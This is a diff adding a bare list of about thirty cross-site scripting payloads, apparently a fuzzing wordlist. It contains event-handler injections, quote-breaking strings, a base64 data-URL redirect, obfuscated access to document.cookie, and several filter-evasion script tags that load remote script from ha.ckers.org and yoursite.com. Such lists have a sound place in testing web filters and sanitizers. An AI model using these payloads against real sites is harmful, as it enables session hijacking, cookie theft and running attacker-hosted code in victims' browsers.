@@ -1,0 +1,31 @@
+<img src=1 onerror=alert(1)>
+self["ale"+"rt"](self["doc"+"ument"]["coo"+"kie"])
+self["$"]["globalEval"]("alert(1)")
+'-alert(document.domain)-'     
+';alert(document.domain)//
+\\';alert(document.domain)//
+javascript:alert(1)
+<body oninput=javascript:alert(1)><input autofocus>
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
+<sVg><scRipt >alert&lpar;1&rpar; {Opera}
+<script ~~~>alert(0%0)</script ~~~>
+<%<!--'%><script>alert(1);</script -->
+<svg/onload=alert(1)
+<script>+-+-1-+-+alert(1)</script>
+'';!--"<XSS>=&{()}
+'>//\\,<'>">">"*"
+'); alert('XSS
+"/></a></><img src=1.gif onerror=alert(1)>
+"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>
+<script+src=">"+src="http://yoursite.com/xss.js?69,69"></script>
+<sVg><scRipt >alert&lpar;1&rpar; {Opera}
+
